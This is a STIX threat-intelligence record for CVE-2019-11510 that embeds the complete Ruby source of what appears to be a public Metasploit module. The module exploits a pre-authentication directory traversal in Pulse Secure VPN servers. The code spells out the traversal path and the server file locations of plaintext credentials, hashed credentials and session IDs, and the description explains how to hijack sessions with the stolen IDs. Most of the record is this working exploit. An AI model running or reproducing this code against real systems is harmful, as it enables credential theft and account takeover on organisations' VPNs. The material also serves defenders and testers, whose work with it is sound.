{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c6b6b17-1133-4f57-99f0-a3022afca299",
    "created": "2024-08-14T16:31:47.168982Z",
    "modified": "2024-08-14T16:31:47.168986Z",
    "name": "Pulse Secure VPN Arbitrary File Disclosure",
    "description": " This module exploits a pre-auth directory traversal in the Pulse Secure VPN server to dump an arbitrary file. Dumped files are stored in loot.  If the \"Automatic\" action is set, plaintext and hashed credentials, as well as session IDs, will be dumped. Valid sessions can be hijacked by setting the \"DSIG\" browser cookie to a valid session ID.  For the \"Manual\" action, please specify a file to dump via the \"FILE\" option. /etc/passwd will be dumped by default. If the \"PRINT\" option is set, file contents will be printed to the screen, with any unprintable characters replaced by a period.  Please see related module exploit/linux/http/pulse_secure_cmd_exec for a post-auth exploit that can leverage the results from this module. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/pulse_secure_file_disclosure.rb",
            "external_id": "pulse_secure_file_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11510"
        },
        {
            "source_name": "reference",
            "url": "https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/591295"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Pulse Secure VPN Arbitrary File Disclosure',\n      'Description'         => %q{\n        This module exploits a pre-auth directory traversal in the Pulse Secure\n        VPN server to dump an arbitrary file. Dumped files are stored in loot.\n\n        If the \"Automatic\" action is set, plaintext and hashed credentials, as\n        well as session IDs, will be dumped. Valid sessions can be hijacked by\n        setting the \"DSIG\" browser cookie to a valid session ID.\n\n        For the \"Manual\" action, please specify a file to dump via the \"FILE\"\n        option. /etc/passwd will be dumped by default. If the \"PRINT\" option is\n        set, file contents will be printed to the screen, with any unprintable\n        characters replaced by a period.\n\n        Please see related module exploit/linux/http/pulse_secure_cmd_exec for\n        a post-auth exploit that can leverage the results from this module.\n      },\n      'Author'              => [\n        'Orange Tsai',    # Discovery (@orange_8361)\n        'Meh Chang',      # Discovery (@mehqq_)\n        'Alyssa Herrera', # PoC       (@Alyssa_Herrera_)\n        'Justin Wagner',  # Module    (@0xDezzy)\n        'wvu'             # Module\n      ],\n      'References'          => [\n        ['CVE', '2019-11510'],\n        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],\n        ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],\n        ['URL', 'https://hackerone.com/reports/591295']\n      ],\n      'DisclosureDate'      => '2019-04-24', # Public disclosure\n      'License'             => MSF_LICENSE,\n      'Actions'             => [\n        ['Automatic', 'Description' => 'Dump creds and sessions'],\n        ['Manual',    'Description' => 'Dump an arbitrary file (FILE option)']\n      ],\n      'DefaultAction'       => 'Automatic',\n      'DefaultOptions'      => {\n        'RPORT'             => 443,\n        'SSL'               => true,\n        'HttpClientTimeout' => 5 # This seems sane\n      },\n      'Notes'               => {\n        'Stability'         => [CRASH_SAFE],\n        'SideEffects'       => [IOC_IN_LOGS],\n        'Reliability'       => [],\n        'RelatedModules'    => ['exploit/linux/http/pulse_secure_cmd_exec']\n      }\n    ))\n\n    register_options([\n      OptString.new(\n        'FILE',\n        [\n          true,\n          'File to dump (manual mode only)',\n          '/etc/passwd'\n        ]\n      ),\n      OptBool.new(\n        'PRINT',\n        [\n          false,\n          'Print file contents (manual mode only)',\n          true\n        ]\n      )\n    ])\n  end\n\n  def the_chosen_one\n    return datastore['FILE'], 'User-chosen file'\n  end\n\n  def run\n    files =\n      case action.name\n      when 'Automatic'\n        print_status('Running in automatic mode')\n\n        # Order by most sensitive first\n        [\n          plaintext_creds,\n          session_ids,\n          hashed_creds\n        ]\n      when 'Manual'\n        print_status('Running in manual mode')\n\n        # /etc/passwd by default\n        [the_chosen_one]\n      end\n\n    files.each do |path, info|\n      print_status(\"Dumping #{path}\")\n\n      res = send_request_cgi(\n        'method'  => 'GET',\n        'uri'     => dir_traversal(path),\n        'partial' => true # Allow partial response due to timeout\n      )\n\n      unless res\n        fail_with(Failure::Unreachable, \"Could not dump #{path}\")\n      end\n\n      handle_response(res, path, info)\n    end\n  end\n\n  def handle_response(res, path, info)\n    case res.code\n    when 200\n      case action.name\n      when 'Automatic'\n        # TODO: Parse plaintext and hashed creds\n        if path == session_ids.first\n          print_status('Parsing session IDs...')\n\n          parse_sids(res.body).each do |sid|\n            print_good(\"Session ID found: #{sid}\")\n          end\n        end\n      when 'Manual'\n        printable = res.body.gsub(/[^[:print:][:space:]]/, '.')\n\n        print_line(printable) if datastore['PRINT']\n      end\n\n      print_good(store_loot(\n        self.name,                  # ltype\n        'application/octet-stream', # ctype\n        rhost,                      # host\n        res.body,                   # data\n        path,                       # filename\n        info                        # info\n      ))\n    when 302\n      fail_with(Failure::NotVulnerable, \"Redirected to #{res.redirection}\")\n    when 400\n      print_error(\"Invalid path #{path}\")\n    when 404\n      print_error(\"#{path} not found\")\n    else\n      print_error(\"I don't know what a #{res.code} code is\")\n    end\n  end\n\n  def dir_traversal(path)\n    normalize_uri(\n      '/dana-na/../dana/html5acc/guacamole/../../../../../..',\n      \"#{path}?/dana/html5acc/guacamole/\" # Bypass query/vars_get\n    )\n  end\n\n  def parse_sids(body)\n    body.to_s.scan(/randomVal([[:xdigit:]]+)/).flatten.reverse\n  end\n\n  def plaintext_creds\n    return '/data/runtime/mtmp/lmdb/dataa/data.mdb', 'Plaintext credentials'\n  end\n\n  def session_ids\n    return '/data/runtime/mtmp/lmdb/randomVal/data.mdb', 'Session IDs'\n  end\n\n  def hashed_creds\n    return '/data/runtime/mtmp/system', 'Hashed credentials'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-04-24, # Public disclosure"
}